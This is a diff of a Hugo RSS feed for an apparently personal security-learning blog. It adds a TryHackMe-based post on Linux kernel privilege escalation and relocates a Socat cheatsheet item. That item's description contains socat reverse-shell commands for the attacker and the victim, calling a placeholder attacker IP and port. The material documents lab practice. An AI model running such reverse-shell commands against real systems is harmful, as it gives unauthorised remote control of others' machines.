@@ -4,12 +4,22 @@
         <link>/posts/</link>
         <description>All Posts | </description>
         <generator>Hugo -- gohugo.io</generator><language>en</language><managingEditor>Securitynguyen@gmail.com (Nguyen Nguyen)</managingEditor>
-            <webMaster>Securitynguyen@gmail.com (Nguyen Nguyen)</webMaster><lastBuildDate>Tue, 20 Jun 2023 00:00:00 &#43;0000</lastBuildDate><atom:link href="/posts/" rel="self" type="application/rss+xml" /><item>
+            <webMaster>Securitynguyen@gmail.com (Nguyen Nguyen)</webMaster><lastBuildDate>Fri, 23 Jun 2023 00:00:00 &#43;0000</lastBuildDate><atom:link href="/posts/" rel="self" type="application/rss+xml" /><item>
+    <title>Kernel Exploits - Linux Privilege Escalation</title>
+    <link>/posts/linux-privilege-escalation/kernel-exploit-linux-privilege-escalation/</link>
+    <pubDate>Fri, 23 Jun 2023 00:00:00 &#43;0000</pubDate>
+    <author>Nguyen Nguyen</author>
+    <guid>/posts/linux-privilege-escalation/kernel-exploit-linux-privilege-escalation/</guid>
+    <description><![CDATA[This post used the Linux Privilege Escalation Room at TryHackMe for lab. https://tryhackme.com/room/linprivesc Definition of a Kernel: Core component of an operating system that powers and controls the computer system.
+You can think of a Kernel as a Car engine. Car engine is the core component that powers and controls the entire vehicle.
+When you successfully control the kernel that mean you have root privilege meaning you can do anything you want.]]></description>
+</item>
+<item>
     <title>Socat Cheatsheet - Better netcat</title>
-    <link>/posts/socat-red-team-tool/</link>
+    <link>/posts/linux-privilege-escalation/socat-red-team-tool/</link>
     <pubDate>Tue, 20 Jun 2023 00:00:00 &#43;0000</pubDate>
     <author>Nguyen Nguyen</author>
-    <guid>/posts/socat-red-team-tool/</guid>
+    <guid>/posts/linux-privilege-escalation/socat-red-team-tool/</guid>
     <description><![CDATA[Tool used to establish a more stabilize shell compare to netcat. Features:
 Used of the arrow key Allows for interactive commands such as sudo Use of CTRL + S, CTRL + C Reverse Shell for Linux Attacker:
 socat TCP-L:&lt;port&gt; FILE:tty,raw,echo=0 Victim: socat TCP:&lt;attacker-ip&gt;:&lt;attacker-port&gt; EXEC:&quot;bash -li&quot;,pty,stderr,sigint,setsid,sane Additional step: Open a new command prompt, and type stty-a, record the value of rows and columns
@@ -80,14 +90,6 @@ Traceroute If you want Nmap to find the routers between you and the target, you 
     <author>Nguyen Nguyen</author>
     <guid>/posts/test-scan/</guid>
     <description><![CDATA[After setting up my Kali Linux (Attacker) and my vulnerable server metasploitable2, I'm ready to try scanning it and see the network activity it generates.]]></description>
-</item>
-<item>
-    <title>Configure Metasploitable3</title>
-    <link>/posts/metasploitable2/</link>
-    <pubDate>Thu, 18 May 2023 00:00:00 &#43;0000</pubDate>
-    <author>Nguyen Nguyen</author>
-    <guid>/posts/metasploitable2/</guid>
-    <description><![CDATA[Today, I'm going configure Metasploitable3 (Linux) Network Configuration]]></description>
 </item>
 </channel>
 </rss>
